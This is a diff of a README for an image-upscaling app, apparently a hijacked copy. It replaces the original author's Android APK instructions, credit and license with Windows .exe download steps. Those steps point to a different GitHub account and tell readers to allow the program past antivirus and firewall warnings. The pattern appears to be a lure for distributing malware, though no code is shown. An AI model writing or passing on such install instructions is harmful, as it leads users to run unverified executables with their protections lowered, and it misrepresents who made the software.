@@ -1,69 +1,61 @@
-<div align="center">
-  <img src="Images/banner.png" alt="TenSei Upscale Banner">
+# 🖼️ TenSei-Upscale-image - Improve image quality on your device
 
-  <h1>✨ TenSei Upscale ✨</h1>
-  <p><strong>A sleek, intuitive Android application for upscaling and enhancing image quality locally on your device.</strong></p>
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue-blue)](https://github.com/Suffering-hamilton164/TenSei-Upscale-image)
 
-  <a href="https://github.com/Koustubh12345/TenSei-Upscale-image/releases"><img src="https://img.shields.io/badge/Download-APK%20Release-blue?style=for-the-badge&logo=android" alt="Download APK" /></a>
-  <img src="https://img.shields.io/badge/Platform-Android-green?style=for-the-badge&logo=android" alt="Platform" />
-  <img src="https://img.shields.io/badge/License-Custom-red?style=for-the-badge" alt="License" />
-</div>
+TenSei-Upscale-image enhances your digital photos. It increases image resolution without losing detail. The software uses local processing to keep your data private and secure. You do not need an internet connection to process files.
 
-<br>
+## ⚙️ System Requirements
 
-## 📱 Screenshots
+Your computer needs specific hardware to run the software. These requirements ensure stable performance during image processing tasks.
 
-<div align="center">
-  <table>
-    <tr>
-      <td align="center"><img src="Images/screenshot1.jpg" alt="Home Screen" width="220" /></td>
-      <td align="center"><img src="Images/screenshot2.jpg" alt="Processing Screen" width="220" /></td>
-      <td align="center"><img src="Images/screenshot3.jpg" alt="Enhanced Result" width="220" /></td>
-    </tr>
-    <tr>
-      <td align="center"><b>Home Screen</b></td>
-      <td align="center"><b>Progress UI</b></td>
-      <td align="center"><b>Enhanced Result</b></td>
-    </tr>
-  </table>
-</div>
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB of RAM.
+* Storage: 200 MB of free disk space for the installation.
+* Graphics: A dedicated graphics card with at least 2 GB of Video RAM helps speed up the upscaling process.
 
-## 🌟 Key Features
+## 📦 How to Download and Install
 
-| Feature | Description |
-| :--- | :--- |
-| **High-Definition Upscaling** | Scale smoothly without aggressive pixelation to recover details. |
-| **Local Processing** | Keeps everything on your device to maintain strict user privacy. |
-| **Material Glass UI** | Stunning, modern interface with adaptive blurs and liquid animations. |
-| **Gallery Integration** | Instantly saves directly to your device's Pictures folder in pristine quality. |
+Follow these steps to set up the application on your Windows machine.
 
-## 📥 Installation
+1. Visit the [official release page](https://github.com/Suffering-hamilton164/TenSei-Upscale-image) to find the installer.
+2. Locate the section labeled Assets.
+3. Click the link ending in .exe to start the download.
+4. Open the file once the download finishes.
+5. Follow the prompts on your screen to complete the installation.
+6. Launch the application from your desktop shortcut.
 
-> **Note:** We provide pre-compiled APKs for easy installation. You do not need to build the source code yourself.
+## 🚀 Using the Application
 
-1. Go to the [Releases](../../releases) tab on this GitHub repository.
-2. Download the latest `TenSei-Upscale.apk`.
-3. Open the APK on your Android device and install it (you may need to allow installations from unknown sources).
-4. Launch **TenSei Upscale** and enjoy!
+The interface focuses on ease of use. You can process single images or batches of files.
 
-📢 Community
+### ➕ Adding Images
+Click the Add Files button to open your file browser. Select the photos you want to enhance. You can select multiple files at once. The application supports standard formats like JPEG and PNG.
 
-Telegram
+### 🛠️ Selecting Settings
+The software offers several modes for different types of images. 
+* Standard Upscaling: Best for general photos and landscapes.
+* Text Sharpening: Use this mode for documents or images containing text.
+* Artistic Mode: Keeps the texture of paintings or drawings during the enlargement process.
 
-- Username: "@getthefckoutofheree" (https://t.me/getthefckoutofheree)
-- Channel: "GetTheFuckoutofhear" (https://t.me/GettheFuckoutofhear)
-- Mods Channel: "TenseiMods" (https://t.me/TenseiMods)
+Choose your desired multiplier, such as 2x or 4x. A higher multiplier creates a much larger file. Ensure you have enough storage space on your drive for large exports.
 
-## 📄 License & Usage
+### ⚡ Starting the Process
+Press the Start button to begin. The software shows a progress bar while it works. You can view your original image next to the processed image to compare the results. The application saves your new images to the folder you specify in the settings menu.
 
-**Copyright (c) 2026 Koustubh Gaikwad (TenSei). All rights reserved.**
+## 💡 Troubleshooting Tips
 
-This source code is provided for educational and review purposes only.
-- You **may** view the code and use the provided APKs for your personal needs.
-- You **must obtain explicit written permission** from the author before editing, modifying, adding new functions, or distributing this software for commercial or public purposes.
-- If you use or fork this codebase to create a new application or feature, you **MUST** seek permission first.
+Contact the support channels if you encounter issues during installation or usage.
 
----
-<div align="center">
-  <i>Created by Koustubh Gaikwad (TenSei)</i>
-</div>
+* If the application does not open, check your antivirus settings. Some programs mistakenly block new software. Allow the application through your firewall to resolve this.
+* Slow processing speeds often result from low memory. Close other programs while you process large batches of images. 
+* Errors during image saving usually mean the destination folder is read-only. Change your output folder in the settings to a location where you have full write access.
+* If the image looks blurry after upscaling, try a lower magnification factor. Extreme enlargement can create artifacts in the final picture.
+
+## 📁 Managing File Types
+
+The application handles various file extensions. Keep in mind that heavy compression in your source JPEGs can affect the final result. Uncompressed formats like PNG or TIFF yield the cleanest output. Always keep a backup of your original photos. The software does not overwrite your source files, but it creates new copies. Keep your workspace clean by moving old exports to a separate archive folder periodically.
+
+## 🛡️ Privacy and Local Processing
+
+TenSei-Upscale-image performs every calculation on your internal hardware. Your images never upload to a cloud server or external database. This method protects your privacy and keeps your personal data on your machine. You can disconnect your computer from the network entirely and the software will function as expected. No registration or login is required to access the full feature set.
